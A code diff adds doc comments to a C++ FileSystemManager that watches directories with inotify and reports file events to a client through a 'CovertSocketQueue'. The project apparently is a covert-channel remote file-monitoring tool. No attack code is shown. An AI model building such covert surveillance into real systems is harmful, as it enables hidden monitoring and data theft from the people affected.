@@ -29,6 +29,14 @@ FileSystemManager::~FileSystemManager() {
     close(this->inotifyFD);
 }
 
+/**
+ * updateNotifyEvents updates the inotify events to be listened on by the hangForEvents function. The passed in message
+ * is assumed to be either a FILE or FILESYNC message and is parsed to determine if an inotify event is already configured
+ * for the directory specified. IF the directory exists, the existing inotify event is removed. If it does not, then it is
+ * added to the listener
+ * @param message Message - A Message object representation of a HAAN packet
+ * @return Bool - State as to whether update was successful or not
+ */
 bool FileSystemManager::updateNotifyEvents(Message message) {
 
     //check if we are already listening in this directory
@@ -88,6 +96,13 @@ bool FileSystemManager::updateNotifyEvents(Message message) {
     };
 }
 
+/**
+ * hangForEvents is the main functionality method for the FileSystemMAnager. hangForEvents configures select with the
+ * current inotify configuration. It then hangs waiting for events for up to 10 seconds before returning. Upon returning
+ * if events have occurred, they are then processed based on their origina and appropriate messages are sent packet to
+ * the client via the CovertSocketQueue and the function returns. If the return is due to a timeout, the function
+ * returns doing nothing.
+ */
 void FileSystemManager::hangForEvents() {
 
     Logger::debug("FileSystemManager:hangForEvents - Creating Structures Before Hang");
